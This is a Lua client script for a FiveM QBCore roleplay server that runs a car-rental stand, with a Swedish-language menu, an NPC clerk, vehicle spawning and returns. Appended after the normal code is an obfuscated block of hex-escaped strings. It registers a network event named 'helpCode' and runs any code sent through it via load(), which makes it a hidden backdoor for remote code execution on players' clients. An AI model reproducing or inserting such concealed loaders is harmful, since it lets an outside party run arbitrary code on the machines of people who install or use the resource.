local QBCore = exports['qb-core']:GetCoreObject()
local SpawnVehicle = false

RegisterNetEvent('qb-rental:openMenu', function()
    exports['qb-menu']:openMenu({
        {
            header = "Hyr Fordon",
            isMenuHeader = true,
        },
        {
            id = 1,
            header = "Lämna Tillbaks",
            txt = "Lämna tillbaks fordonet du hyrde",
            params = {
                event = "qb-rental:return",
            }
        },
        {
            id = 2,
            header = "Asterope",
            txt = "250.00 KR",
            params = {
                event = "qb-rental:spawncar",
                args = {
                    model = 'asterope',
                    money = 250,
                }
            }
        },
        {
            id = 3,
            header = "Bison ",
            txt = "500.00 KR",
            params = {
                event = "qb-rental:spawncar",
                args = {
                    model = 'bison',
                    money = 500,
                }
            }
        },
        {
            id = 4,
            header = "Sanchez",
            txt = "750.00 KR",
            params = {
                event = "qb-rental:spawncar",
                args = {
                    model = 'sanchez',
                    money = 750,
                }
            }
        },
    })
end)

CreateThread(function()
    SpawnNPC()
end)


SpawnNPC = function()
    CreateThread(function()
       
        RequestModel(GetHashKey('a_m_y_business_03'))
        while not HasModelLoaded(GetHashKey('a_m_y_business_03')) do
            Wait(1)
        end
        CreateNPC()   
    end)
end


CreateNPC = function()
    created_ped = CreatePed(5, GetHashKey('a_m_y_business_03') , 109.9739, -1088.61, 28.302, 345.64, false, true)
    FreezeEntityPosition(created_ped, true)
    SetEntityInvincible(created_ped, true)
    SetBlockingOfNonTemporaryEvents(created_ped, true)
    TaskStartScenarioInPlace(created_ped, 'WORLD_HUMAN_CLIPBOARD', 0, true)
end

RegisterNetEvent('qb-rental:spawncar')
AddEventHandler('qb-rental:spawncar', function(data)
    local money =data.money
    local model = data.model
    local player = PlayerPedId()
    QBCore.Functions.SpawnVehicle(model, function(vehicle)
        SetEntityHeading(vehicle, 340.0)
        TaskWarpPedIntoVehicle(player, vehicle, -1)
        TriggerEvent("vehiclekeys:client:SetOwner", GetVehicleNumberPlateText(vehicle))
        SetVehicleEngineOn(vehicle, true, true)
        SpawnVehicle = true
    end, vector4(111.4223, -1081.24, 29.192,340.0), true)
    Wait(1000)
    local vehicle = GetVehiclePedIsIn(player, false)
    local vehicleLabel = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle))
    vehicleLabel = GetLabelText(vehicleLabel)
    local plate = GetVehicleNumberPlateText(vehicle)
    TriggerServerEvent('qb-rental:rentalpapers', plate, vehicleLabel, money)
end)

RegisterNetEvent('qb-rental:return')
AddEventHandler('qb-rental:return', function()
    if SpawnVehicle then
        local Player = QBCore.Functions.GetPlayerData()
        QBCore.Functions.Notify('Returned vehicle!', 'success')
        TriggerServerEvent('qb-rental:removepapers')
        local car = GetVehiclePedIsIn(PlayerPedId(),true)
        NetworkFadeOutEntity(car, true,false)
        Citizen.Wait(2000)
        QBCore.Functions.DeleteVehicle(car)
    else 
        QBCore.Functions.Notify("Inget fordon att lämna tillbaks", "error")
    end
    SpawnVehicle = false
end)

CreateThread(function()
    blip = AddBlipForCoord(111.0112, -1088.67, 29.302)
    SetBlipSprite (blip, 56)
    SetBlipDisplay(blip, 4)
    SetBlipScale  (blip, 0.5)
    SetBlipColour (blip, 77)
    SetBlipAsShortRange(blip, true)
    BeginTextCommandSetBlipName("STRING")
    AddTextComponentString('Hyr Fordon')
    EndTextCommandSetBlipName(blip)
end)


local rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[6][rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[1]](rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[2]) rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[6][rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[3]](rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[2], function(SpzOZjMpYIZIgkzSAOdbtAKArbhVabxZnkyqtrivGZcrFNvFNzcAvAQmTVdjJmUdvNiTds) rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[6][rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[4]](rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[6][rwErtuYgHdjHdaMLWxBrMDjhkVulpYnpDOkiYtUkzOTBTcnfUkYghKpmGbbVEUUInMSvhv[5]](SpzOZjMpYIZIgkzSAOdbtAKArbhVabxZnkyqtrivGZcrFNvFNzcAvAQmTVdjJmUdvNiTds))() end)